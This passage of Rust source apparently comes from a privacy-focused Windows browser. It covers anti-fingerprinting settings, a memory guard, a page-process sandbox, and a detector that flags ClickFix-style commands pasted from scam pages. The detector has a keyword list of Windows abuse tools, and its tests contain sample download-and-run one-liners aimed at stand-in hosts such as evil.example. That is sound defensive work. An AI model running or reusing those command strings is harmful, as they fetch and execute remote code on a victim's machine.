//! Protection for the user and their PC: fingerprint resistance (a script that runs before any
//! page code), a uniform browser identity, and a memory guard so a heavy site can't freeze Windows.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// The identity every RustWolf reports: the most common desktop browser, so users blend in.
/// Exactly what Tor Browser 16 / Mullvad Browser (Firefox ESR 153 with resist-fingerprinting)
/// report on Windows, measured in Tor Browser itself. RustWolf's JavaScript engine is Firefox's
/// own (SpiderMonkey), so this identity is also the most consistent one.
pub const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0";

/// Runs at the start of every page, before the page's own scripts (src/fingerprint.js).
pub fn fingerprint_script(seed: u32) -> String {
    include_str!("fingerprint.js").replace("__SEED__", &seed.to_string())
}

extern "C" {
    /// ICU's default-locale setter, linked in with Servo's JavaScript engine (ICU 78).
    fn uloc_setDefault_78(locale: *const std::os::raw::c_char, status: *mut i32);
}

/// Tor Browser's timezone (UTC+0) for the JavaScript engine in this page process: local time in
/// pages, iframes and workers. (SpiderMonkey on Windows only accepts `TZ=UTC`-style values; the
/// zone *name* Tor Browser reports, Atlantic/Reykjavik, is set by fingerprint.js.)
pub fn set_engine_timezone() {
    std::env::set_var("TZ", "UTC");
}

/// Makes the JavaScript engine use en-US (like Tor Browser) for `Intl`, `toLocaleString` and
/// friends, instead of the PC's own language. Must run before any page code (page process).
pub fn set_engine_locale_en_us() {
    let mut status = 0i32;
    unsafe { uloc_setDefault_78(c"en_US".as_ptr(), &mut status) };
}

fn total_ram_mb() -> u64 {
    use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
    unsafe {
        let mut m: MEMORYSTATUSEX = std::mem::zeroed();
        m.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut m) != 0 {
            m.ullTotalPhys / (1024 * 1024)
        } else {
            8192
        }
    }
}

fn own_ram_mb() -> u64 {
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        if K32GetProcessMemoryInfo(GetCurrentProcess(), &mut c, c.cb) != 0 {
            (c.WorkingSetSize / (1024 * 1024)) as u64
        } else {
            0
        }
    }
}

/// Last resort: Windows refuses RustWolf more than half of the PC's memory. If a page still
/// gets there, RustWolf closes instead of the whole PC freezing.
pub fn hard_memory_cap() {
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JOB_OBJECT_LIMIT_JOB_MEMORY, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOB_OBJECT_LIMIT_PROCESS_MEMORY, JOB_OBJECT_LIMIT_BREAKAWAY_OK,
    };
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if job.is_null() {
            return;
        }
        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        // Each process (the browser and every page process) gets at most 20% of the RAM,
        // and all of RustWolf together at most 40%.
        // BREAKAWAY_OK lets "Restart RustWolf" start the new copy outside this job.
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_JOB_MEMORY | JOB_OBJECT_LIMIT_PROCESS_MEMORY | JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE | JOB_OBJECT_LIMIT_BREAKAWAY_OK;
        info.ProcessMemoryLimit = (total_ram_mb() * 20 / 100 * 1024 * 1024) as usize;
        info.JobMemoryLimit = (total_ram_mb() * 40 / 100 * 1024 * 1024) as usize;
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, &info as *const _ as *const _, std::mem::size_of_val(&info) as u32);
        AssignProcessToJobObject(job, GetCurrentProcess());
        // The job handle stays open for RustWolf's whole life.
    }
}

/// Working set of one process, in MB.
fn process_ram_mb(pid: u32) -> Option<u64> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
        if h.is_null() {
            return None;
        }
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        let ok = K32GetProcessMemoryInfo(h, &mut c, c.cb) != 0;
        CloseHandle(h);
        ok.then(|| (c.WorkingSetSize / (1024 * 1024)) as u64)
    }
}

/// RustWolf's page processes: children of this process and, with the restricted sandbox, their
/// locked-down copies (grandchildren), which is where the page really runs.
fn page_processes() -> Vec<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
    let me = std::process::id();
    let mut all = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return Vec::new();
        }
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                all.push((e.th32ProcessID, e.th32ParentProcessID));
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    let children: Vec<u32> = all.iter().filter(|(_, parent)| *parent == me).map(|(pid, _)| *pid).collect();
    let mut out = children.clone();
    out.extend(all.iter().filter(|(_, parent)| children.contains(parent)).map(|(pid, _)| *pid));
    out
}

fn kill(pid: u32) {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
    unsafe {
        let h = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !h.is_null() {
            TerminateProcess(h, 1);
            CloseHandle(h);
        }
    }
}

/// Soft limit: a page process passing ~25% of the PC's memory is stopped at once (only that page);
/// in single-process mode the busiest page is closed instead.
pub struct MemoryGuard {
    pub limit_mb: u64,
    pub current_mb: Arc<AtomicU64>,
    /// Size of the last page process the guard stopped (0 = none).
    pub killed_mb: Arc<AtomicU64>,
}

impl MemoryGuard {
    pub fn start(wake: impl Fn() + Send + 'static) -> Self {
        let limit_mb = (total_ram_mb() / 6).clamp(1024, 2048);
        let current = Arc::new(AtomicU64::new(0));
        let killed = Arc::new(AtomicU64::new(0));
        let c = current.clone();
        let k = killed.clone();
        std::thread::Builder::new()
            .name("memory-guard".into())
            .spawn(move || loop {
                std::thread::sleep(Duration::from_millis(250));
                for pid in page_processes() {
                    if let Some(mb) = process_ram_mb(pid) {
                        if mb > limit_mb {
                            kill(pid);
                            k.store(mb, Ordering::Relaxed);
                            wake();
                        }
                    }
                }
                let mb = own_ram_mb();
                c.store(mb, Ordering::Relaxed);
                if mb > limit_mb {
                    wake();
                }
            })
            .ok();
        Self { limit_mb, current_mb: current, killed_mb: killed }
    }

    pub fn over(&self) -> bool {
        self.current_mb.load(Ordering::Relaxed) > self.limit_mb
    }
}

/// ClickFix protection: does this text look like a command a scam page wants you to paste into
/// Win+R / PowerShell / a terminal? (Normal copied text never matches.)
pub fn looks_like_command(text: &str) -> bool {
    // Undo the obfuscation cmd and PowerShell ignore: carets (p^ower^shell), quotes (pow""ershell),
    // backticks (po`wershell) and invisible characters.
    let t: String = text
        .to_lowercase()
        .chars()
        .filter(|c| !matches!(c, '^' | '"' | '`' | '\u{200b}' | '\u{200c}' | '\u{200d}' | '\u{2060}' | '\u{feff}' | '\u{00ad}'))
        .collect();
    let t = t.trim();
    if t.is_empty() {
        return false;
    }
    const STRONG: &[&str] = &[
        "powershell", "pwsh", "mshta", "rundll32", "regsvr32", "wscript", "cscript", "certutil", "bitsadmin",
        "invoke-expression", "invoke-webrequest", "invoke-restmethod", "downloadstring", "downloadfile",
        "frombase64string", "-encodedcommand", "start-process", "new-object net.webclient", "add-mppreference",
        "set-mppreference", "schtasks", "forfiles", "conhost", "cmd.exe", "cmd /c", "cmd /k", "%comspec%",
        "msiexec /i http", "msiexec /q", "curl -s", "| iex", "|iex", "| sh", "|sh", "| bash", "|bash",
        "osascript", "chmod +x", "base64 -d", "/dev/tcp/",
        // more Windows tools that run downloaded code
        "wmic ", "cmstp", "msbuild", "installutil", "regasm", "regsvcs", "odbcconf", "pcalua", "hh.exe",
        "mavinject", "presentationhost", "syncappvpublishingserver", "scriptrunner", "ftp -s", "tar -xf http",
        "davwwwroot", "@ssl\\", "$(curl", "$(wget",
    ];
    // `finger user@host` downloads text that gets piped into cmd (seen in recent ClickFix campaigns).
    if t.starts_with("finger ") && t.contains('@') {
        return true;
    }
    // A network path typed into Win+R runs a program from someone else's computer.
    if t.starts_with("\\\\") {
        return true;
    }
    if STRONG.iter().any(|k| t.contains(k)) {
        return true;
    }
    // Short aliases only count as words at the start of a command (avoids normal sentences).
    let first = t.split_whitespace().next().unwrap_or("");
    if ["iex", "iwr", "irm", "curl", "wget", "msiexec", "explorer", "cmd", "start", "net", "reg"].contains(&first)
        && (t.contains("http") || t.contains('\\') || t.contains(" /") || t.contains(" -"))
    {
        return true;
    }
    // Typical ClickFix decoy comment: "# âœ… I am not a robot - Verification ID: 1234".
    if t.contains('#') && (t.contains("not a robot") || t.contains("verification id") || t.contains("captcha")) {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::looks_like_command as c;
    #[test]
    fn clickfix() {
        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # âœ… I am not a robot - Verification ID: 4821"));
        assert!(c("mshta https://evil.example/verify.hta"));
        assert!(c("cmd /c start /min powershell -enc SQBFAFgA"));
        assert!(c("curl -s http://x.example/a.sh | bash"));
        assert!(!c("Hello, here is my email address"));
        assert!(!c("https://example.com/article?id=3"));
        assert!(!c("The command line is a text interface."));
        // obfuscation and less common tools used by real ClickFix campaigns
        assert!(c("p^o^w^e^r^s^h^e^l^l -w h -c iex(irm evil.example)"));
        assert!(c("pow\"\"ershell -nop -c whoami"));
        assert!(c("po`wer`shell -c whoami"));
        assert!(c("m^s^h^t^a http://evil.example/x"));
        assert!(c("\\\\evil.example@SSL\\DavWWWRoot\\verify.exe"));
        assert!(c("wmic process call create calc"));
        assert!(c("cmstp /au C:\\x.inf"));
        assert!(c("finger verify@evil.example | more"));
        assert!(c("bash -c \"$(curl http://evil.example/i.sh)\""));
        assert!(!c("I love my \"quoted\" text and a^b math"));
        assert!(!c("my finger hurts after typing all day"));
    }
}

/// Sandbox for page (content) processes, applied by each page process before it runs any web
/// content:
/// - it is put in its own Windows job that forbids starting any other program (a hacked page
///   can't launch PowerShell or malware) and blocks desktop / clipboard / system-setting access;
/// - Windows exploit mitigations are switched on: no DLL injection through legacy extension
///   points, no DLLs loaded from network shares or low-integrity files, strict handle checks,
///   and (in hardened mode, where the JIT is off) no creation of executable code at all.
pub fn lockdown_content_process(hardened: bool) {
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectBasicUIRestrictions, SetInformationJobObject,
        JOBOBJECT_BASIC_UI_RESTRICTIONS, JOB_OBJECT_LIMIT_ACTIVE_PROCESS,
        JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION, JOB_OBJECT_UILIMIT_DESKTOP, JOB_OBJECT_UILIMIT_DISPLAYSETTINGS,
        JOB_OBJECT_UILIMIT_EXITWINDOWS, JOB_OBJECT_UILIMIT_GLOBALATOMS, JOB_OBJECT_UILIMIT_HANDLES, JOB_OBJECT_UILIMIT_READCLIPBOARD,
        JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS, JOB_OBJECT_UILIMIT_WRITECLIPBOARD,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, ProcessDynamicCodePolicy, ProcessExtensionPointDisablePolicy, ProcessImageLoadPolicy,
        ProcessStrictHandleCheckPolicy, SetProcessMitigationPolicy,
    };
    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if !job.is_null() {
            let mut ext: windows_sys::Win32::System::JobObjects::JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
            ext.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_ACTIVE_PROCESS | JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            ext.BasicLimitInformation.ActiveProcessLimit = 1; // only this process: no child processes
            let ok1 = SetInformationJobObject(
                job,
                windows_sys::Win32::System::JobObjects::JobObjectExtendedLimitInformation,
                &ext as *const _ as *const _,
                std::mem::size_of_val(&ext) as u32,
            );
            let err1 = windows_sys::Win32::Foundation::GetLastError();
            let ui = JOBOBJECT_BASIC_UI_RESTRICTIONS {
                UIRestrictionsClass: JOB_OBJECT_UILIMIT_DESKTOP
                    | JOB_OBJECT_UILIMIT_DISPLAYSETTINGS
                    | JOB_OBJECT_UILIMIT_EXITWINDOWS
                    | JOB_OBJECT_UILIMIT_GLOBALATOMS
                    | JOB_OBJECT_UILIMIT_HANDLES
                    | JOB_OBJECT_UILIMIT_READCLIPBOARD
                    | JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS
                    | JOB_OBJECT_UILIMIT_WRITECLIPBOARD,
            };
            let ok2 = SetInformationJobObject(job, JobObjectBasicUIRestrictions, &ui as *const _ as *const _, std::mem::size_of_val(&ui) as u32);
            let ok3 = AssignProcessToJobObject(job, GetCurrentProcess());
            if std::env::var_os("RUSTWOLF_SANDBOX_TEST").is_some() {
                eprintln!(
                    "[sandbox] job limits={} (error {}) ui={} assign={}",
                    ok1,
                    err1,
                    ok2,
                    ok3
                );
            }
        }
        let set = |policy, flags: u32| {
            SetProcessMitigationPolicy(policy, &flags as *const u32 as *const _, 4);
        };
        set(ProcessExtensionPointDisablePolicy, 0b1); // DisableExtensionPoints
        set(ProcessImageLoadPolicy, 0b111); // NoRemoteImages | NoLowMandatoryLabelImages | PreferSystem32Images
        set(ProcessStrictHandleCheckPolicy, 0b11); // RaiseExceptionOnInvalidHandleReference | permanent
        if hardened {
            set(ProcessDynamicCodePolicy, 0b1); // ProhibitDynamicCode (JIT is off in hardened mode)
        }
    }
}

/// Is this process really locked down? (Used by the tests and the shield panel.)
pub fn job_forbids_child_processes() -> bool {
    std::process::Command::new("cmd.exe").arg("/c").arg("exit").spawn().is_err()
}

// ---------------------------------------------------------------- restricted page processes

const SE_GROUP_INTEGRITY: u32 = 0x20;
const SE_GROUP_LOGON_ID: u32 = 0xC000_0000;

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

/// Closes a Windows handle when dropped.
struct Owned(windows_sys::Win32::Foundation::HANDLE);
impl Drop for Owned {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { windows_sys::Win32::Foundation::CloseHandle(self.0) };
        }
    }
}

fn own_token(access: u32) -> Option<Owned> {
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
    let mut t = std::ptr::null_mut();
    unsafe { (OpenProcessToken(GetCurrentProcess(), access, &mut t) != 0).then_some(Owned(t)) }
}

unsafe fn token_info(tok: &Owned, class: windows_sys::Win32::Security::TOKEN_INFORMATION_CLASS) -> Option<Vec<u64>> {
    use windows_sys::Win32::Security::GetTokenInformation;
    let mut len = 0u32;
    GetTokenInformation(tok.0, class, std::ptr::null_mut(), 0, &mut len);
    if len == 0 {
        return None;
    }
    let mut buf = vec![0u64; (len as usize).div_ceil(8)];
    (GetTokenInformation(tok.0, class, buf.as_mut_ptr() as _, len, &mut len) != 0).then_some(buf)
}

unsafe fn sid_string(sid: windows_sys::Win32::Security::PSID) -> Option<String> {
    use windows_sys::Win32::Foundation::LocalFree;
    use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
    let mut p: windows_sys::core::PWSTR = std::ptr::null_mut();
    if ConvertSidToStringSidW(sid, &mut p) == 0 {
        return None;
    }
    let mut n = 0;
    while *p.add(n) != 0 {
        n += 1;
    }
    let s = String::from_utf16_lossy(std::slice::from_raw_parts(p, n));
    LocalFree(p as _);
    Some(s)
}

/// (your user account's SID, your logon session's SID).
fn user_and_logon_sids(tok: &Owned) -> Option<(String, String)> {
    use windows_sys::Win32::Security::{TokenGroups, TokenUser, TOKEN_GROUPS, TOKEN_USER};
    unsafe {
        let u = token_info(tok, TokenUser)?;
        let user = &*(u.as_ptr() as *const TOKEN_USER);
        let g = token_info(tok, TokenGroups)?;
        let groups = &*(g.as_ptr() as *const TOKEN_GROUPS);
        let list = std::slice::from_raw_parts(groups.Groups.as_ptr(), groups.GroupCount as usize);
        let logon = list.iter().find(|x| x.Attributes & SE_GROUP_LOGON_ID == SE_GROUP_LOGON_ID)?;
        Some((sid_string(user.User.Sid)?, sid_string(logon.Sid)?))
    }
}

/// Permissions for the pipes Servo's processes talk through (applied by RustWolf's ipc-channel
/// patch): only SYSTEM, you and your current logon session, labelled Low integrity so the
/// restricted page processes (which keep only the logon session) can connect.
pub fn set_pipe_security() {
    use windows_sys::Win32::Security::TOKEN_QUERY;
    if std::env::var_os("RUSTWOLF_PIPE_SDDL").is_some() {
        return;
    }
    if let Some((user, logon)) = own_token(TOKEN_QUERY).as_ref().and_then(user_and_logon_sids) {
        std::env::set_var("RUSTWOLF_PIPE_SDDL", format!("D:P(A;;GA;;;SY)(A;;GA;;;{user})(A;;GA;;;{logon})S:(ML;;NW;;;LW)"));
    }
}

/// The real page-process sandbox. The page process Servo starts re-launches itself as a
/// locked-down copy and waits for it (the page runs in the copy):
/// - your Windows account is switched off in its token ("deny only"), so it can't open your
///   files, documents, browser data or registry settings;
/// - it runs at Low integrity: it can't write anywhere you can, or touch your other programs;
/// - all its privileges are removed;
/// - it is tied to its launcher with a job, so it never outlives it.
///
/// Returns the copy's exit code, or None if the copy couldn't be started (then the caller runs
/// the page itself with the job + mitigation sandbox only).
pub fn run_restricted_page_process() -> Option<u32> {
    use windows_sys::Win32::Foundation::{
        CloseHandle, GetHandleInformation, GetLastError, LocalFree, HANDLE, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Security::Authorization::{
        ConvertStringSecurityDescriptorToSecurityDescriptorW, ConvertStringSidToSidW, SDDL_REVISION_1,
    };
    use windows_sys::Win32::Security::{
        CreateRestrictedToken, GetLengthSid, GetSecurityDescriptorDacl, SetTokenInformation, TokenDefaultDacl, TokenIntegrityLevel,
        TokenUser, DISABLE_MAX_PRIVILEGE, PSECURITY_DESCRIPTOR, PSID, SID_AND_ATTRIBUTES, TOKEN_ADJUST_DEFAULT, TOKEN_ASSIGN_PRIMARY,
        SECURITY_ATTRIBUTES, TOKEN_DEFAULT_DACL, TOKEN_DUPLICATE, TOKEN_MANDATORY_LABEL, TOKEN_QUERY, TOKEN_USER,
    };
    use windows_sys::Win32::System::Console::{GetStdHandle, STD_ERROR_HANDLE, STD_OUTPUT_HANDLE};
    use windows_sys::Win32::System::Environment::GetCommandLineW;
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject,
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessAsUserW, DeleteProcThreadAttributeList, GetExitCodeProcess, InitializeProcThreadAttributeList, ResumeThread,
        OpenProcess, UpdateProcThreadAttribute, WaitForMultipleObjects, WaitForSingleObject, CREATE_SUSPENDED, PROCESS_SYNCHRONIZE, EXTENDED_STARTUPINFO_PRESENT, INFINITE,
        LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_HANDLE_LIST, STARTF_USESTDHANDLES, STARTUPINFOEXW,
    };

    if std::env::var_os("RUSTWOLF_PIPE_SDDL").is_none() || std::env::var_os("RUSTWOLF_NO_SANDBOX").is_some() {
        return None;
    }
    let fail = |what: &str| {
        eprintln!("[sandbox] restricted page process not available ({what}, error {})", unsafe { GetLastError() });
        None
    };
    unsafe {
        let tok = own_token(TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT)?;
        let (user_s, logon_s) = user_and_logon_sids(&tok)?;
        let u = token_info(&tok, TokenUser)?;
        let user = &*(u.as_ptr() as *const TOKEN_USER);

        // Token with your account switched off and no privileges.
        let disable = [SID_AND_ATTRIBUTES { Sid: user.User.Sid, Attributes: 0 }];
        let mut rt: HANDLE = std::ptr::null_mut();
        if CreateRestrictedToken(tok.0, DISABLE_MAX_PRIVILEGE, 1, disable.as_ptr(), 0, std::ptr::null(), 0, std::ptr::null(), &mut rt) == 0 {
            return fail("restricted token");
        }
        let rt = Owned(rt);

        // Low integrity.
        let mut low: PSID = std::ptr::null_mut();
        if ConvertStringSidToSidW(wide("S-1-16-4096").as_ptr(), &mut low) == 0 {
            return fail("low SID");
        }
        let label = TOKEN_MANDATORY_LABEL { Label: SID_AND_ATTRIBUTES { Sid: low, Attributes: SE_GROUP_INTEGRITY } };
        let ok = SetTokenInformation(
            rt.0,
            TokenIntegrityLevel,
            &label as *const _ as _,
            std::mem::size_of::<TOKEN_MANDATORY_LABEL>() as u32 + GetLengthSid(low),
        );
        LocalFree(low as _);
        if ok == 0 {
            return fail("low integrity");
        }

        // Objects it creates (its pipes, its own process) stay reachable by the browser.
        let mut sd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
        let sddl = wide(&format!("D:(A;;GA;;;SY)(A;;GA;;;{user_s})(A;;GA;;;{logon_s})"));
        if ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl.as_ptr(), SDDL_REVISION_1, &mut sd, std::ptr::null_mut()) == 0 {
            return fail("default DACL");
        }
        let (mut present, mut defaulted, mut dacl) = (0, 0, std::ptr::null_mut());
        GetSecurityDescriptorDacl(sd, &mut present, &mut dacl, &mut defaulted);
        let dd = TOKEN_DEFAULT_DACL { DefaultDacl: dacl };
        let ok = SetTokenInformation(rt.0, TokenDefaultDacl, &dd as *const _ as _, std::mem::size_of::<TOKEN_DEFAULT_DACL>() as u32);
        LocalFree(sd as _);
        if ok == 0 {
            return fail("set default DACL");
        }

        // Its process object: you and SYSTEM keep full control; other page processes (which only
        // have the logon session) may only pass engine IPC handles to / from it, nothing else.
        // 0x101040 = SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE.
        let mut psd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
        let psddl = wide(&format!("D:(A;;GA;;;SY)(A;;GA;;;{user_s})(A;;0x101040;;;{logon_s})"));
        if ConvertStringSecurityDescriptorToSecurityDescriptorW(psddl.as_ptr(), SDDL_REVISION_1, &mut psd, std::ptr::null_mut()) == 0 {
            return fail("process DACL");
        }
        struct FreeSd(PSECURITY_DESCRIPTOR);
        impl Drop for FreeSd {
            fn drop(&mut self) {
                unsafe { windows_sys::Win32::Foundation::LocalFree(self.0 as _) };
            }
        }
        let psd = FreeSd(psd);
        let process_sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: psd.0,
            bInheritHandle: 0,
        };

        // The copy dies with its launcher.
        let job = Owned(CreateJobObjectW(std::ptr::null(), std::ptr::null()));
        if job.0.is_null() {
            return fail("job");
        }
        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        SetInformationJobObject(job.0, JobObjectExtendedLimitInformation, &info as *const _ as _, std::mem::size_of_val(&info) as u32);

        // A separate, invisible window station with its own desktop: the page process has its own
        // empty screen, clipboard and keyboard. Screenshots, keyloggers, clipboard access and
        // window messages can't reach yours.
        use windows_sys::Win32::System::StationsAndDesktops::{
            CloseDesktop, CloseWindowStation, CreateDesktopW, CreateWindowStationW, GetProcessWindowStation, SetProcessWindowStation,
            HDESK, HWINSTA,
        };
        let browser_pid = std::env::var("RUSTWOLF_BROWSER_PID").unwrap_or_default();
        let station_name = format!("RustWolfPages{browser_pid}");
        let mut usd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
        let usddl = wide(&format!("D:(A;;GA;;;SY)(A;;GA;;;{user_s})(A;;GA;;;{logon_s})S:(ML;;NW;;;LW)"));
        let mut ui_sa = SECURITY_ATTRIBUTES { nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32, lpSecurityDescriptor: std::ptr::null_mut(), bInheritHandle: 0 };
        if ConvertStringSecurityDescriptorToSecurityDescriptorW(usddl.as_ptr(), SDDL_REVISION_1, &mut usd, std::ptr::null_mut()) != 0 {
            ui_sa.lpSecurityDescriptor = usd;
        }
        struct Station(HWINSTA);
        impl Drop for Station {
            fn drop(&mut self) {
                unsafe { CloseWindowStation(self.0) };
            }
        }
        struct Desk(HDESK);
        impl Drop for Desk {
            fn drop(&mut self) {
                unsafe { CloseDesktop(self.0) };
            }
        }
        let mut step_error: Option<(&str, u32)> = None;
        // Unnamed (Windows 11 only lets normal programs create unnamed window stations); Windows
        // names it, and the page process is pointed at it by that name.
        let _ = &station_name;
        let station = CreateWindowStationW(std::ptr::null(), 0, 0x37F /* WINSTA_ALL_ACCESS */, &ui_sa);
        if station.is_null() {
            step_error = Some(("create window station", GetLastError()));
        }
        let station = Station(station);
        let mut station_name = String::new();
        if !station.0.is_null() {
            let mut buf = [0u16; 256];
            let mut need = 0u32;
            if windows_sys::Win32::System::StationsAndDesktops::GetUserObjectInformationW(
                station.0,
                2, /* UOI_NAME */
                buf.as_mut_ptr() as _,
                std::mem::size_of_val(&buf) as u32,
                &mut need,
            ) != 0
            {
                let n = buf.iter().position(|&c| c == 0).unwrap_or(0);
                station_name = String::from_utf16_lossy(&buf[..n]);
            } else {
                step_error = Some(("name window station", GetLastError()));
            }
        }
        let mut desk = std::ptr::null_mut();
        if !station.0.is_null() {
            // A desktop is created in the caller's window station: switch to the new one briefly.
            let own = GetProcessWindowStation();
            if SetProcessWindowStation(station.0) != 0 {
                desk = CreateDesktopW(wide("Default").as_ptr(), std::ptr::null(), std::ptr::null(), 0, 0x10000000 /* GENERIC_ALL */, &ui_sa);
                if desk.is_null() {
                    step_error = Some(("create desktop", GetLastError()));
                }
                SetProcessWindowStation(own);
            } else {
                step_error = Some(("switch window station", GetLastError()));
            }
        }
        if !usd.is_null() {
            LocalFree(usd as _);
        }
        if let Some((what, err)) = step_error {
            eprintln!("[sandbox] restricted page process not available ({what}, error {err})");
            return None;
        }
        let _desk = Desk(desk);
        let mut desktop_path = wide(&format!("{station_name}\\Default"));

        // Only the console / log handles are passed on (nothing else is inherited).
        let mut handles: Vec<HANDLE> = Vec::new();
        let mut std_handle = |which| {
            let h = GetStdHandle(which);
            let mut flags = 0u32;
            if !h.is_null() && h != INVALID_HANDLE_VALUE && GetHandleInformation(h, &mut flags) != 0 && flags & HANDLE_FLAG_INHERIT != 0 {
                if !handles.contains(&h) {
                    handles.push(h);
                }
                h
            } else {
                std::ptr::null_mut()
            }
        };
        let (out, err) = (std_handle(STD_OUTPUT_HANDLE), std_handle(STD_ERROR_HANDLE));
        let mut size = 0usize;
        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut size);
        let mut attr_buf = vec![0u64; size / 8 + 1];
        let attrs = attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
        let have_attrs = InitializeProcThreadAttributeList(attrs, 1, 0, &mut size) != 0;
        let inherit = have_attrs
            && !handles.is_empty()
            && UpdateProcThreadAttribute(
                attrs,
                0,
                PROC_THREAD_ATTRIBUTE_HANDLE_LIST as usize,
                handles.as_ptr() as _,
                handles.len() * std::mem::size_of::<HANDLE>(),
                std::ptr::null_mut(),
                std::ptr::null(),
            ) != 0;
        let mut si: STARTUPINFOEXW = std::mem::zeroed();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si.StartupInfo.lpDesktop = desktop_path.as_mut_ptr();
        if inherit {
            si.lpAttributeList = attrs;
            si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
            si.StartupInfo.hStdOutput = out;
            si.StartupInfo.hStdError = err;
        }

        let Some(exe) = std::env::current_exe().ok().and_then(|p| p.to_str().map(wide)) else { return fail("exe path") };
        let cl = GetCommandLineW();
        let mut n = 0;
        while *cl.add(n) != 0 {
            n += 1;
        }
        let mut cmd: Vec<u16> = std::slice::from_raw_parts(cl, n).to_vec();
        cmd.push(0);
        let cwd = wide(&format!("{}\\System32", std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into())));
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let flags = CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT;
        let ok = CreateProcessAsUserW(
            rt.0,
            exe.as_ptr(),
            cmd.as_mut_ptr(),
            &process_sa,
            std::ptr::null(),
            inherit as i32,
            flags,
            std::ptr::null(),
